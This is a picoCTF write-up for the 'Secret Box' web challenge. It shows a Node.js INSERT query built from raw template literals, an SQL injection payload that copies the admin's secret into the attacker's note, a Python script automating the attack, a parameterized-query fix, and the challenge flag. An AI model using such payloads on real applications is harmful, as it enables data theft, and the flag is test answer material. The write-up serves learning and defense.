# Secret Box CTF Writeup

## About the Challenge

A web app where users store private notes called secrets. The goal is to retrieve the flag stored in the administrator's account. Full source code was provided.

---

## Vulnerability

In `server.js`, the POST handler for `/secrets/create` builds the SQL query using template literals:

```javascript
const query = await db.raw(
    `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
);
```

The `content` field is never sanitized, making this a classic **SQL injection** vulnerability.

---

## Exploitation

The database schema reveals the admin's fixed UUID: `e2a66f7d-2ce6-4861-b4aa-be8e069601cb`.

After signing up and logging in, I submitted the following payload in the content field:

```
' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'))--
```

This transforms the query into:

```sql
INSERT INTO secrets(owner_id, content) VALUES ('my-user-id', '' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'))-- ')
```

The `||` operator concatenates the admin's secret into the content value, and `--` comments out the rest. The flag is then inserted as one of my own secrets and visible on the home page.

---

## Automation
I also made a python script to get the flag:

```python
#!/usr/bin/env python3
import requests
import re
import argparse

parser = argparse.ArgumentParser(description="Secret Box PicoCTF")
parser.add_argument("-u", "--url", required=True, help="Target URL")
args = parser.parse_args()


BASE_URL = args.url
session = requests.Session()

print("[*] Signing up...")
session.post(f"{BASE_URL}/signup", data={
    "username": "goat",
    "password": "root"
})

print("[*] Logging in...")
session.post(f"{BASE_URL}/login", data={
    "username": "goat",
    "password": "root"
})

admin_uuid = "e2a66f7d-2ce6-4861-b4aa-be8e069601cb"
payload = f"' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'))-- "

print("[*] Injecting SQL payload...")
session.post(f"{BASE_URL}/secrets/create", data={
    "content": payload
})

print("[*] Retrieving flag...")
response = session.get(f"{BASE_URL}/")

flag_pattern = r"picoCTF\{[^}]+\}"
matches = re.findall(flag_pattern, response.text)

if matches:
    print(f"\n[+] Flag: {matches[0]}")
else:
    print("[-] Flag not found")
```

---

## Remediation

Use parameterized queries:

```javascript
await db.raw(`INSERT INTO secrets(owner_id, content) VALUES (?, ?)`, [userId, content]);
```

---

## Flag

```
picoCTF{sq1_1nject10n_a8db399d}
```
